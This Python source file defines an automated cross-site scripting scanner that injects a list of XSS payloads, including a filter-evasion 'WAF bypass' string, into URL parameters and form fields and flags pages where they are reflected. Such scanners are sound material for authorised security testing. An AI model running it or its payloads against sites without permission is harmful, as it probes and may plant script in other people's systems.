import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from bs4 import BeautifulSoup


class XSSTester:
    """
    Advanced XSS tester for reflected and simple stored XSS.
    Uses diverse payloads and smarter reflection checks.
    """

    def __init__(self, session=None):
        self.session = session or requests.Session()
        self.vulnerable = []

    def xss_payloads(self):
        """
        Diverse payloads: classic, event handlers, obfuscated.
        """
        return [
            "<script>alert(1)</script>",
            "\"><svg/onload=alert(2)>",
            "'><img src=x onerror=alert(3)>",
            "';alert(4);//",
            "<body onresize=alert(5)>",
            "<iframe src=javascript:alert(6)>",
            "<details open ontoggle=alert(7)>",
            "<object data='javascript:alert(8)'></object>",
            # Placeholder for WAF bypass:
            "\"><scr<script>ipt>alert(9)</scr</script>ipt>"
        ]

    def is_payload_reflected(self, resp_text, payload):
        """
        Basic check if payload is reflected anywhere.
        """
        return payload in resp_text

    def detect_context(self, resp_text, payload):
        """
        Basic heuristic: Where is the payload reflected? HTML? Attribute? Script?
        """
        snippet = resp_text.split(payload, 1)
        if len(snippet) == 2:
            before = snippet[0][-30:]
            after = snippet[1][:30]
            context = "unknown"
            if "<script" in before.lower():
                context = "script block"
            elif "=" in before:
                context = "attribute"
            elif "<" in before:
                context = "HTML body"
            return context, before + payload + after
        return "unknown", ""

    def test_url(self, parsed, query_params):
        """
        Fuzz query parameters with XSS payloads.
        """
        for param in query_params:
            for payload in self.xss_payloads():
                test_params = parse_qs(parsed.query)
                test_params[param] = payload
                new_query = urlencode(test_params, doseq=True)
                new_url = urlunparse(parsed._replace(query=new_query))

                try:
                    resp = self.session.get(new_url, timeout=10)
                    if resp.status_code == 200 and self.is_payload_reflected(resp.text, payload):
                        context, snippet = self.detect_context(resp.text, payload)
                        vuln = {
                            "url": new_url,
                            "param": param,
                            "payload": payload,
                            "vuln_type": "Reflected XSS",
                            "severity": "High",
                            "context": context,
                            "evidence": snippet[:200]
                        }
                        self.vulnerable.append(vuln)
                        print(f"[+] Possible Reflected XSS ({context}): {new_url}")

                except requests.RequestException as e:
                    print(f"[!] XSS test failed for {new_url}: {e}")

    def test_form(self, url, form_info):
        """
        Submit XSS payloads to input fields.
        """
        form_html = form_info.get('form_html')
        if not form_html:
            return

        soup = BeautifulSoup(form_html, "html.parser")
        form = soup.find("form")
        if not form:
            return

        action = form.get("action") or url
        method = form.get("method", "get").lower()
        inputs = {}

        for input_tag in form.find_all(["input", "textarea"]):
            name = input_tag.get("name")
            if name:
                if input_tag.get("type") == "text" or input_tag.name == "textarea":
                    inputs[name] = self.xss_payloads()[0]
                else:
                    inputs[name] = input_tag.get("value", "")

        full_url = urljoin(url, action)

        try:
            if method == "post":
                resp = self.session.post(full_url, data=inputs, timeout=10)
            else:
                resp = self.session.get(full_url, params=inputs, timeout=10)

            if resp.status_code == 200 and self.xss_payloads()[0] in resp.text:
                context, snippet = self.detect_context(resp.text, self.xss_payloads()[0])
                vuln = {
                    "url": full_url,
                    "param": "form",
                    "payload": self.xss_payloads()[0],
                    "vuln_type": "Stored/Reflected XSS",
                    "severity": "High",
                    "context": context,
                    "evidence": snippet[:200]
                }
                self.vulnerable.append(vuln)
                print(f"[+] Possible XSS in form ({context}): {full_url}")

        except requests.RequestException as e:
            print(f"[!] XSS form test failed for {full_url}: {e}")

    def run(self, url_list, forms=[]):
        """
        Run XSS tests on all URLs & forms.
        """
        for url in url_list:
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            if query_params:
                self.test_url(parsed, query_params)

        for form_info in forms:
            self.test_form(form_info['url'], form_info)

        return self.vulnerable

